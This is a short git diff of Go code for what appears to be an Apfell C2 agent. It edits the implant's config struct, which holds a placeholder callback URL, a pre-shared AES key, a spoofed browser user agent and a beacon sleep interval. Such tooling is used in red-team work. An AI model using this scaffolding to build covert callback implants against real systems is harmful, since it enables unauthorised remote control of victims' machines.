@@ -13,17 +13,20 @@ import (
 
 // PConfig - Persistent C2 config values
 var PConfig = structs.Mainconfig{
-	"UUID",                                   // Unique identifier from Apfell
+	"UUI",                                    // Unique identifier from Apfell
 	"T",                                      // Key exchange boolean
 	"AESPSK",                                 // AES Pre-shared key from Apfell
 	"http(s)://callback_host:callback_port/", // Callback url
 	[]string{},                               // Call back urls
 	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3", // User Agent
-	"SLEEP_REPLACE", // Sleep interval. Converted to an integer in the profile,
-	"",
+	"10", // Sleep interval. Converted to an integer in the profile,
+	"",   // Host Header
 }
 
-var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
+var (
+	seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
+	ApiVersion            = "1.4"
+)
 
 const (
 	//CheckInMsg - Messages for apfell
